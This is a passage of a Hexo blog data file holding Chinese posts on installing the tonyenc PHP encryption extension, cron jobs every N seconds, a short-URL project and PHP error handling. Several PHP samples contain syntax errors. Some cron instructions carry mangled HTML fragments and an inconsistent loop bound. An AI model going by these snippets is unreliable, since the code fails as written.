8 =&gt; 1]</span></span><br><span class=\"line\">arsort($cv);</span><br><span class=\"line\">$max = <span class=\"type\">key</span>($cv);</span><br><span class=\"line\">var_dump($max);</span><br><span class=\"line\"><span class=\"comment\">// 结果 11</span></span><br></pre></td></tr></table></figure>\n<p><code>array_count_values</code>函数的功能是「统计数组中所有的值」，就是将原数组中的值作为返回数组的键名，值出现的次数作为返回数组的值</p>\n<p>这样便可以通过 <code>arsort</code> 函数对出现的次数进行降序排序并且保持索引关联</p>\n<p>最后使用 <code>key</code> 获得当前单元（当前单元默认为数组第一个成员）的键名，此时的键名即是原数组的值重复次数最多的值</p>\n"},{"layout":"post","title":"php代码加密-tonyenc","abbrlink":50056,"date":"2019-05-16T11:19:11.000Z","_content":"\n### 前言\n\n最近公司出售了一个项目，商业源码自然要加密，网上的一些加密被破解的可能性较大，用起来也不方便，作为github的伟大搬运工，找到了一个简洁、高性能、跨平台的 PHP7 代码加密扩展-tonyenc\n\n<!-- more -->\n\ngithub项目地址：https://github.com/lihancong/tonyenc\n\n### 安装\n\n```shell\ngit clone https://github.com/lihancong/tonyenc\n\ncd tonyenc\n\nphpize\n\n./configure --with-php-config = [自己php版本的php-config文件]\n\nmake && make install\n```\n\n> php版本要7.0以上\n\n修改php.ini文件追加扩展\n\n```shell\nextension=tonyenc.so\n```\n\n> MAMP软件中修改php.ini模版文件，是无效的，要修改真实的php.ini文件\n\n搞定后重启环境，测试是否成功\n\n```shell\nphp -m |grep tonyenc\n```\n\n### 加密\n\n#### 加密不可逆，切记要备份！！！！\n\n加密文件，这个文件它提供了，名字叫tonyenc.php，复制保存到合适位置，然后执行\n\n```shell\nphp tonyenc.php [需要加密的文件或路径]\n```","source":"_posts/2019/5/tonyenc.md","raw":"---\nlayout: post\ntitle: php代码加密-tonyenc\ntags:\n  - php\ncategories:\n  - php\nabbrlink: 50056\ndate: 2019-05-16 19:19:11\n---\n\n### 前言\n\n最近公司出售了一个项目，商业源码自然要加密，网上的一些加密被破解的可能性较大，用起来也不方便，作为github的伟大搬运工，找到了一个简洁、高性能、跨平台的 PHP7 代码加密扩展-tonyenc\n\n<!-- more -->\n\ngithub项目地址：https://github.com/lihancong/tonyenc\n\n### 安装\n\n```shell\ngit clone https://github.com/lihancong/tonyenc\n\ncd tonyenc\n\nphpize\n\n./configure --with-php-config = [自己php版本的php-config文件]\n\nmake && make install\n```\n\n> php版本要7.0以上\n\n修改php.ini文件追加扩展\n\n```shell\nextension=tonyenc.so\n```\n\n> MAMP软件中修改php.ini模版文件，是无效的，要修改真实的php.ini文件\n\n搞定后重启环境，测试是否成功\n\n```shell\nphp -m |grep tonyenc\n```\n\n### 加密\n\n#### 加密不可逆，切记要备份！！！！\n\n加密文件，这个文件它提供了，名字叫tonyenc.php，复制保存到合适位置，然后执行\n\n```shell\nphp tonyenc.php [需要加密的文件或路径]\n```","slug":"2019/5/tonyenc","published":1,"updated":"2020-04-12T06:34:43.622Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzm000q44vqwuvqma1e","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>最近公司出售了一个项目，商业源码自然要加密，网上的一些加密被破解的可能性较大，用起来也不方便，作为github的伟大搬运工，找到了一个简洁、高性能、跨平台的 PHP7 代码加密扩展-tonyenc</p>\n<a id=\"more\"></a>\n<p>github项目地址：<a href=\"https://github.com/lihancong/tonyenc\" target=\"_blank\" rel=\"noopener\">https://github.com/lihancong/tonyenc</a></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/lihancong/tonyenc</span><br><span class=\"line\"></span><br><span class=\"line\">cd tonyenc</span><br><span class=\"line\"></span><br><span class=\"line\">phpize</span><br><span class=\"line\"></span><br><span class=\"line\">./configure --with-php-config = [自己php版本的php-config文件]</span><br><span class=\"line\"></span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>php版本要7.0以上</p>\n</blockquote>\n<p>修改php.ini文件追加扩展</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extension=tonyenc.so</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>MAMP软件中修改php.ini模版文件，是无效的，要修改真实的php.ini文件</p>\n</blockquote>\n<p>搞定后重启环境，测试是否成功</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -m |grep tonyenc</span><br></pre></td></tr></table></figure>\n<h3 id=\"加密\"><a href=\"#加密\" class=\"headerlink\" title=\"加密\"></a>加密</h3><h4 id=\"加密不可逆，切记要备份！！！！\"><a href=\"#加密不可逆，切记要备份！！！！\" class=\"headerlink\" title=\"加密不可逆，切记要备份！！！！\"></a>加密不可逆，切记要备份！！！！</h4><p>加密文件，这个文件它提供了，名字叫tonyenc.php，复制保存到合适位置，然后执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php tonyenc.php [需要加密的文件或路径]</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>最近公司出售了一个项目，商业源码自然要加密，网上的一些加密被破解的可能性较大，用起来也不方便，作为github的伟大搬运工，找到了一个简洁、高性能、跨平台的 PHP7 代码加密扩展-tonyenc</p>","more":"<p>github项目地址：<a href=\"https://github.com/lihancong/tonyenc\" target=\"_blank\" rel=\"noopener\">https://github.com/lihancong/tonyenc</a></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/lihancong/tonyenc</span><br><span class=\"line\"></span><br><span class=\"line\">cd tonyenc</span><br><span class=\"line\"></span><br><span class=\"line\">phpize</span><br><span class=\"line\"></span><br><span class=\"line\">./configure --with-php-config = [自己php版本的php-config文件]</span><br><span class=\"line\"></span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>php版本要7.0以上</p>\n</blockquote>\n<p>修改php.ini文件追加扩展</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extension=tonyenc.so</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>MAMP软件中修改php.ini模版文件，是无效的，要修改真实的php.ini文件</p>\n</blockquote>\n<p>搞定后重启环境，测试是否成功</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -m |grep tonyenc</span><br></pre></td></tr></table></figure>\n<h3 id=\"加密\"><a href=\"#加密\" class=\"headerlink\" title=\"加密\"></a>加密</h3><h4 id=\"加密不可逆，切记要备份！！！！\"><a href=\"#加密不可逆，切记要备份！！！！\" class=\"headerlink\" title=\"加密不可逆，切记要备份！！！！\"></a>加密不可逆，切记要备份！！！！</h4><p>加密文件，这个文件它提供了，名字叫tonyenc.php，复制保存到合适位置，然后执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php tonyenc.php [需要加密的文件或路径]</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"crontab实现N秒定时","abbrlink":65133,"date":"2019-05-27T02:50:57.000Z","_content":"\n### 前言\n\ncrontab 命令最小的执行时间是一分钟，有时需要按秒执行定时任务，有两种方法可以实现\n\n<!--more-->\n\n### 使用延时来实现每N秒执行\n\n通过延时方法 sleep N 来实现每N秒执行，首先创建一个php脚本test.php,本例test.php放在home目录下，功能是把当前时间写入/log/run.log\n\n```shell\ncrontab -e\n```\n\n输入以下语句保存退出：\n\n```shell\n* * * * * php /home/test.php\n* * * * * sleep 10; php /home/test.php\n* * * * * sleep 20; php /home/test.php\n* * * * * sleep 30; php /home/test.php\n* * * * * sleep 40; php /home/test.php\n* * * * * sleep 50; php /home/test.php\n```\n\n使用 tail -f 查看执行情况\n\n```shell\ntail -f /log/run.log\n```\n\n60必须能整除间隔的秒数，如果间隔的秒数太少，例如2秒执行一次，这样就需要在crontab 加入60/2=30条语句\n\n### 编写shell脚本实现\n\n在脚本中使用for语句指定秒数执行，创建脚本文件crontab.sh,j本例放在home目录下：\n\n```shell\n#!/bin/bash\n\nstep=2 #间隔的秒数，不能大于60\n\nfor (( i = 0; i < 60; i=(i+step) )); do\n    $(php '/home/test.php')\n    sleep $step\ndone\n\nexit 0\n```\n\ncrontab -e 输入以下语句后保存退出：\n\n```shell\n* * * * * /home/crontab.sh\n```\n\n使用 tail -f 查看执行情况，可以发现run.log每2秒被写入一条记录。如果60不能整除间隔的秒数，则需要调整执行的时间。例如需要每7秒执行一次，就需要找到7与60的最小公倍数，7与60的最小公倍数是420（即7分钟）。\n\n则 crontab.sh step的值为7，循环结束条件i<420， crontab=\"\" -e可以输入以下语句来实现:`<=\"\" p=\"\">`\n\n```shell\n*/7 * * * * /home/crontab.sh\n```","source":"_posts/2019/5/crontab实现N秒定时.md","raw":"---\nlayout: post\ntitle: crontab实现N秒定时\ntags:\n  - linux\ncategories:\n  - linux\nabbrlink: 65133\ndate: 2019-05-27 10:50:57\n---\n\n### 前言\n\ncrontab 命令最小的执行时间是一分钟，有时需要按秒执行定时任务，有两种方法可以实现\n\n<!--more-->\n\n### 使用延时来实现每N秒执行\n\n通过延时方法 sleep N 来实现每N秒执行，首先创建一个php脚本test.php,本例test.php放在home目录下，功能是把当前时间写入/log/run.log\n\n```shell\ncrontab -e\n```\n\n输入以下语句保存退出：\n\n```shell\n* * * * * php /home/test.php\n* * * * * sleep 10; php /home/test.php\n* * * * * sleep 20; php /home/test.php\n* * * * * sleep 30; php /home/test.php\n* * * * * sleep 40; php /home/test.php\n* * * * * sleep 50; php /home/test.php\n```\n\n使用 tail -f 查看执行情况\n\n```shell\ntail -f /log/run.log\n```\n\n60必须能整除间隔的秒数，如果间隔的秒数太少，例如2秒执行一次，这样就需要在crontab 加入60/2=30条语句\n\n### 编写shell脚本实现\n\n在脚本中使用for语句指定秒数执行，创建脚本文件crontab.sh,j本例放在home目录下：\n\n```shell\n#!/bin/bash\n\nstep=2 #间隔的秒数，不能大于60\n\nfor (( i = 0; i < 60; i=(i+step) )); do\n    $(php '/home/test.php')\n    sleep $step\ndone\n\nexit 0\n```\n\ncrontab -e 输入以下语句后保存退出：\n\n```shell\n* * * * * /home/crontab.sh\n```\n\n使用 tail -f 查看执行情况，可以发现run.log每2秒被写入一条记录。如果60不能整除间隔的秒数，则需要调整执行的时间。例如需要每7秒执行一次，就需要找到7与60的最小公倍数，7与60的最小公倍数是420（即7分钟）。\n\n则 crontab.sh step的值为7，循环结束条件i<420， crontab=\"\" -e可以输入以下语句来实现:`<=\"\" p=\"\">`\n\n```shell\n*/7 * * * * /home/crontab.sh\n```","slug":"2019/5/crontab实现N秒定时","published":1,"updated":"2020-04-12T06:34:43.622Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzm000t44vqkrls8n4p","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>crontab 命令最小的执行时间是一分钟，有时需要按秒执行定时任务，有两种方法可以实现</p>\n<a id=\"more\"></a>\n<h3 id=\"使用延时来实现每N秒执行\"><a href=\"#使用延时来实现每N秒执行\" class=\"headerlink\" title=\"使用延时来实现每N秒执行\"></a>使用延时来实现每N秒执行</h3><p>通过延时方法 sleep N 来实现每N秒执行，首先创建一个php脚本test.php,本例test.php放在home目录下，功能是把当前时间写入/log/run.log</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -e</span><br></pre></td></tr></table></figure>\n<p>输入以下语句保存退出：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* * * * * php /home/test.php</span><br><span class=\"line\">* * * * * sleep 10; php /home/test.php</span><br><span class=\"line\">* * * * * sleep 20; php /home/test.php</span><br><span class=\"line\">* * * * * sleep 30; php /home/test.php</span><br><span class=\"line\">* * * * * sleep 40; php /home/test.php</span><br><span class=\"line\">* * * * * sleep 50; php /home/test.php</span><br></pre></td></tr></table></figure>\n<p>使用 tail -f 查看执行情况</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tail -f /log/run.log</span><br></pre></td></tr></table></figure>\n<p>60必须能整除间隔的秒数，如果间隔的秒数太少，例如2秒执行一次，这样就需要在crontab 加入60/2=30条语句</p>\n<h3 id=\"编写shell脚本实现\"><a href=\"#编写shell脚本实现\" class=\"headerlink\" title=\"编写shell脚本实现\"></a>编写shell脚本实现</h3><p>在脚本中使用for语句指定秒数执行，创建脚本文件crontab.sh,j本例放在home目录下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">step=2 #间隔的秒数，不能大于60</span><br><span class=\"line\"></span><br><span class=\"line\">for (( i = 0; i &lt; 60; i=(i+step) )); do</span><br><span class=\"line\">    $(php '/home/test.php')</span><br><span class=\"line\">    sleep $step</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">exit 0</span><br></pre></td></tr></table></figure>\n<p>crontab -e 输入以下语句后保存退出：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* * * * * /home/crontab.sh</span><br></pre></td></tr></table></figure>\n<p>使用 tail -f 查看执行情况，可以发现run.log每2秒被写入一条记录。如果60不能整除间隔的秒数，则需要调整执行的时间。例如需要每7秒执行一次，就需要找到7与60的最小公倍数，7与60的最小公倍数是420（即7分钟）。</p>\n<p>则 crontab.sh step的值为7，循环结束条件i&lt;420， crontab=”” -e可以输入以下语句来实现:<code>&lt;=&quot;&quot; p=&quot;&quot;&gt;</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*/7 * * * * /home/crontab.sh</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>crontab 命令最小的执行时间是一分钟，有时需要按秒执行定时任务，有两种方法可以实现</p>","more":"<h3 id=\"使用延时来实现每N秒执行\"><a href=\"#使用延时来实现每N秒执行\" class=\"headerlink\" title=\"使用延时来实现每N秒执行\"></a>使用延时来实现每N秒执行</h3><p>通过延时方法 sleep N 来实现每N秒执行，首先创建一个php脚本test.php,本例test.php放在home目录下，功能是把当前时间写入/log/run.log</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -e</span><br></pre></td></tr></table></figure>\n<p>输入以下语句保存退出：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* * * * * php /home/test.php</span><br><span class=\"line\">* * * * * sleep 10; php /home/test.php</span><br><span class=\"line\">* * * * * sleep 20; php /home/test.php</span><br><span class=\"line\">* * * * * sleep 30; php /home/test.php</span><br><span class=\"line\">* * * * * sleep 40; php /home/test.php</span><br><span class=\"line\">* * * * * sleep 50; php /home/test.php</span><br></pre></td></tr></table></figure>\n<p>使用 tail -f 查看执行情况</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tail -f /log/run.log</span><br></pre></td></tr></table></figure>\n<p>60必须能整除间隔的秒数，如果间隔的秒数太少，例如2秒执行一次，这样就需要在crontab 加入60/2=30条语句</p>\n<h3 id=\"编写shell脚本实现\"><a href=\"#编写shell脚本实现\" class=\"headerlink\" title=\"编写shell脚本实现\"></a>编写shell脚本实现</h3><p>在脚本中使用for语句指定秒数执行，创建脚本文件crontab.sh,j本例放在home目录下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">step=2 #间隔的秒数，不能大于60</span><br><span class=\"line\"></span><br><span class=\"line\">for (( i = 0; i &lt; 60; i=(i+step) )); do</span><br><span class=\"line\">    $(php '/home/test.php')</span><br><span class=\"line\">    sleep $step</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">exit 0</span><br></pre></td></tr></table></figure>\n<p>crontab -e 输入以下语句后保存退出：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* * * * * /home/crontab.sh</span><br></pre></td></tr></table></figure>\n<p>使用 tail -f 查看执行情况，可以发现run.log每2秒被写入一条记录。如果60不能整除间隔的秒数，则需要调整执行的时间。例如需要每7秒执行一次，就需要找到7与60的最小公倍数，7与60的最小公倍数是420（即7分钟）。</p>\n<p>则 crontab.sh step的值为7，循环结束条件i&lt;420， crontab=”” -e可以输入以下语句来实现:<code>&lt;=&quot;&quot; p=&quot;&quot;&gt;</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*/7 * * * * /home/crontab.sh</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"短链接","abbrlink":61992,"date":"2019-04-19T11:21:36.000Z","_content":"\n最近一个项目中要求使用短链接，谷歌了一下明白基本原理，懒得自己动手，随便找了一个php github项目\n\n### github项目地址\n\nhttps://github.com/achais/shorturl\n\n### 新浪微博app key\n\nhttps://fengmk2.com/blog/appkey.html\n\n\n基本实现需求\n","source":"_posts/2019/5/短链接.md","raw":"---\nlayout: post\ntitle: 短链接\ntags:\n  - php\ncategories:\n  - php\nabbrlink: 61992\ndate: 2019-04-19 19:21:36\n---\n\n最近一个项目中要求使用短链接，谷歌了一下明白基本原理，懒得自己动手，随便找了一个php github项目\n\n### github项目地址\n\nhttps://github.com/achais/shorturl\n\n### 新浪微博app key\n\nhttps://fengmk2.com/blog/appkey.html\n\n\n基本实现需求\n","slug":"2019/5/短链接","published":1,"updated":"2020-04-12T06:34:43.623Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzn000x44vqeoant4q1","content":"<p>最近一个项目中要求使用短链接，谷歌了一下明白基本原理，懒得自己动手，随便找了一个php github项目</p>\n<h3 id=\"github项目地址\"><a href=\"#github项目地址\" class=\"headerlink\" title=\"github项目地址\"></a>github项目地址</h3><p><a href=\"https://github.com/achais/shorturl\" target=\"_blank\" rel=\"noopener\">https://github.com/achais/shorturl</a></p>\n<h3 id=\"新浪微博app-key\"><a href=\"#新浪微博app-key\" class=\"headerlink\" title=\"新浪微博app key\"></a>新浪微博app key</h3><p><a href=\"https://fengmk2.com/blog/appkey.html\" target=\"_blank\" rel=\"noopener\">https://fengmk2.com/blog/appkey.html</a></p>\n<p>基本实现需求</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近一个项目中要求使用短链接，谷歌了一下明白基本原理，懒得自己动手，随便找了一个php github项目</p>\n<h3 id=\"github项目地址\"><a href=\"#github项目地址\" class=\"headerlink\" title=\"github项目地址\"></a>github项目地址</h3><p><a href=\"https://github.com/achais/shorturl\" target=\"_blank\" rel=\"noopener\">https://github.com/achais/shorturl</a></p>\n<h3 id=\"新浪微博app-key\"><a href=\"#新浪微博app-key\" class=\"headerlink\" title=\"新浪微博app key\"></a>新浪微博app key</h3><p><a href=\"https://fengmk2.com/blog/appkey.html\" target=\"_blank\" rel=\"noopener\">https://fengmk2.com/blog/appkey.html</a></p>\n<p>基本实现需求</p>\n"},{"layout":"post","title":"PHP中的错误处理","abbrlink":30879,"_content":"\n### 前言\n\nPHP里有一套错误处理机制，可以使用set_error_handler接管PHP错误处理，也可以使用trigger_error函数主动抛出一个错误。\n\n<!--more-->\n\n### set_error_handler\n\nset_error_handler()函数设置用户自定义的错误处理函数。函数用于创建运行期间的用户自己的错误处理方法。它需要先创建一个错误处理函数，然后设置错误级别。语法如下：\n\n```php\nset_error_handler(error_function, error_type)\n```\n\n- error_function :发生错误时运行的函数\n- error_type : 错误级别，默认为E_ALL\n\n如果使用该函数，会完全绕过PHP错误处理函数，如果有必要，自定义的错误处理程序必须终止脚本\n\n如果在脚本执行前发生错误，那时自定义程序还没有注册，就不会用到自定义错误处理程序\n\n### 自定义异常处理\n\n```php\n\n<?php\n\nfunction customError($errno, $errstr, $errfile, $errline)\n{\n    echo '错误代码:'$errno.$errstr;\n    echo '错误所在:'$errfile.$errline;\n}\n\nset_error_handler(customError, E_ALL|E_STRICT);\n\n$a = ['o' => 2,4,5];\n\necho $a['o'];\n\n```\n\n自定义的错误处理函数一定要有这四个输入变量＄errno、＄errstr、＄errfile、＄errline\n\nerrno是一组常量，代表错误的等级，同时也有一组整数和其对应，但一般使用其字符串值表示，这样语义更好一点。比如E_WARNING，其二进制掩码为4.，表示警告信息\n\n接下来，就是将这个函数作为回调参数传递给set_error_handler。这样就能接管PHP原生的错误处理函数了。要注意的是，这种托管方式并不能托管所有种类的错误，如E_ERROR、E_PARSE、E_CORE_ERROR、E_CORE_WARNING、E_COMPILE_ERROR、E_COMPILE_WARNING，以及E_STRICT中的部分。这些错误会以最原始的方式显示，或者不显示\n\n### restore_error_handler\n\nset_error_handler函数会接管PHP内置的错误处理，可以在同一个页面使用restore_error_handler()；取消接管\n\n如果使用自定义的set_error_handler接管PHP的错误处理，代码里的错误抑制@将失效，这种错误也会被显示\n\n在PHP异常中，异常处理机制是有限的，无法自动抛出异常，必须手动进行，并且内置异常有限。PHP把许多异常看作错误，这样就可以把这些“异常”像错误一样用set_error_handler接管，进而主动抛出异常\n\n```php\n\nfunction customError($errno, $errstr, $errfile, $errline)\n{\n    throw new Exception($errno.'|'.$errstr);\n}\n\nset_error_handler('customError', E_ALL|E_STRICT);\n\ntry\n{\n    $a = 5/0;\n}\ncatch(Exception $e)\n{\n    echo $e->getMessage();\n}\n\n```\n\n这样就能捕获到异常和非致命的错误，可以弥补PHP异常处理机制的部分不足\n\n\n### register_shutdown_function\n\nfetal error这样的错误捕获不到，也无法在发生此错误后恢复流程处理，但是还是可以使用一些特殊方法对这种错误进行处理。这需要用到`register_shutdown_function()`\n\n此函数会在PHP程序终止或者die时触发一个函数\n\n```php\n\n<?php\n\nclass Shutdown\n{\n    public function stop()\n    {\n        if (error_get_last()) {\n            print_r(error_get_last);\n        }\n\n        die('Stop');\n    }\n\n    register_shutdown_function([new Shutdown(), 'stop']);\n\n    $a = new a();\n\n    echo 'end';\n}\n\n```\n\n对于fetal error还能做点收尾工作，但是PHP流程的终止是必然的。对于Parse error级别的错误，除了可以修改配置文件php.ini，什么都做不了\n\n```\nlog_errors = On\nerror_log = usr/log/php.log\n```\n\n这样一旦PHP发生了错误，就会被记入log文件，方便以后查询\n\n### trigger_error\n\n和exception类似，错误处理也有对应抛出错误的函数，那就是trigger_error函数\n\n```php\n\n<?php\n\n$d = 0;\n\nif ($d == 0) {\n    trigger_error('cannot d by zero', E_USER_ERROR);\n}\n\necho 'break';\n```\n\n### 结语\n\n在PHP中，错误和异常是两个不同的概念，这种设计从根本上导致了PHP的异常和其他语言相异。以Java为例，Java中，异常是错误唯一的报告方式。说到底，两者的区别就是对异常和错误的认识不同而产生的。PHP的异常绝大部分必须通过某种办法手动抛出，才能被捕获到，是一种半自动化的异常处理机制。 无论是错误还是异常，都可以使用handler接管系统已有的处理机制","source":"_posts/2019/6/PHP中的错误处理.md","raw":"---\nlayout: post\ntitle: PHP中的错误处理\ntags:\n  - php\ncategories:\n  - php\nabbrlink: 30879\n---\n\n### 前言\n\nPHP里有一套错误处理机制，可以使用set_error_handler接管PHP错误处理，也可以使用trigger_error函数主动抛出一个错误。\n\n<!--more-->\n\n### set_error_handler\n\nset_error_handler()函数设置用户自定义的错误处理函数。函数用于创建运行期间的用户自己的错误处理方法。它需要先创建一个错误处理函数，然后设置错误级别。语法如下：\n\n```php\nset_error_handler(error_function, error_type)\n```\n\n- error_function :发生错误时运行的函数\n- error_type : 错误级别，默认为E_ALL\n\n如果使用该函数，会完全绕过PHP错误处理函数，如果有必要，自定义的错误处理程序必须终止脚本\n\n如果在脚本执行前发生错误，那时自定义程序还没有注册，就不会用到自定义错误处理程序\n\n### 自定义异常处理\n\n```php\n\n<?php\n\nfunction customError($errno, $errstr, $errfile, $errline)\n{\n    echo '错误代码:'$errno.$errstr;\n    echo '错误所在:'$errfile.$errline;\n}\n\nset_error_handler(customError, E_ALL|E_STRICT);\n\n$a = ['o' => 2,4,5];\n\necho $a['o'];\n\n```\n\n自定义的错误处理函数一定要有这四个输入变量＄errno、＄errstr、＄errfile、＄errline\n\nerrno是一组常量，代表错误的等级，同时也有一组整数和其对应，但一般使用其字符串值表示，这样语义更好一点。比如E_WARNING，其二进制掩码为4.，表示警告信息\n\n接下来，就是将这个函数作为回调参数传递给set_error_handler。这样就能接管PHP原生的错误处理函数了。要注意的是，这种托管方式并不能托管所有种类的错误，如E_ERROR、E_PARSE、E_CORE_ERROR、E_CORE_WARNING、E_COMPILE_ERROR、E_COMPILE_WARNING，以及E_STRICT中的部分。这些错误会以最原始的方式显示，或者不显示\n\n### restore_error_handler\n\nset_error_handler函数会接管PHP内置的错误处理，可以在同一个页面使用restore_error_handler()；取消接管\n\n如果使用自定义的set_error_handler接管PHP的错误处理，代码里的错误抑制@将失效，这种错误也会被显示\n\n在PHP异常中，异常处理机制是有限的，无法自动抛出异常，必须手动进行，并且内置异常有限。PHP把许多异常看作错误，这样就可以把这些“异常”像错误一样用set_error_handler接管，进而主动抛出异常\n\n```php\n\nfunction customError($errno, $errstr, $errfile, $errline)\n{\n    throw new Exception($errno.'|'.$errstr);\n}\n\nset_error_handler('customError', E_ALL|E_STRICT);\n\ntry\n{\n    $a = 5/0;\n}\ncatch(Exception $e)\n{\n    echo $e->getMessage();\n}\n\n```\n\n这样就能捕获到异常和非致命的错误，可以弥补PHP异常处理机制的部分不足\n\n\n### register_shutdown_function\n\nfetal error这样的错误捕获不到，也无法在发生此错误后恢复流程处理，但是还是可以使用一些特殊方法对这种错误进行处理。这需要用到`register_shutdown_function()`\n\n此函数会在PHP程序终止或者die时触发一个函数\n\n```php\n\n<?php\n\nclass Shutdown\n{\n    public function stop()\n    {\n        if (error_get_last()) {\n            print_r(error_get_last);\n        }\n\n        die('Stop');\n    }\n\n    register_shutdown_function([new Shutdown(), 'stop']);\n\n    $a = new a();\n\n    echo 'end';\n}\n\n```\n\n对于fetal error还能做点收尾工作，但是PHP流程的终止是必然的。对于Parse error级别的错误，除了可以修改配置文件php.ini，什么都做不了\n\n```\nlog_errors = On\nerror_log = usr/log/php.log\n```\n\n这样一旦PHP发生了错误，就会被记入log文件，方便以后查询\n\n### trigger_error\n\n和exception类似，错误处理也有对应抛出错误的函数，那就是trigger_error函数\n\n```php\n\n<?php\n\n$d = 0;\n\nif ($d == 0) {\n    trigger_error('cannot d by zero', E_USER_ERROR);\n}\n\necho 'break';\n```\n\n### 